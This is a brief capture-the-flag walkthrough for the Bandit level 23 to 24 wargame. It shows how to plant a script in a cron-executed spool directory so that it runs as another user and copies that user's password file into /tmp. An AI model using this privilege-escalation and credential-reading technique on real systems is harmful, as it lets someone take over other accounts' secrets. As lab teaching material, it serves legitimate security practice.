# Bandit Level 23 → Level 24

This is another cron-job exploit.

Inspect:

```
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24
```

You'll discover that scripts placed in:

```
/var/spool/bandit24/foo
```

are executed by `bandit24`.

Create a script:

```
nano /tmp/getpass.sh
```

Put in:

```
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24pass
```

Then:

```
chmod +x /tmp/getpass.sh
cp /tmp/getpass.sh /var/spool/bandit24/foo
```

Wait for the cron job, then:

```
cat /tmp/bandit24pass
```

That gives the Level 24 password.
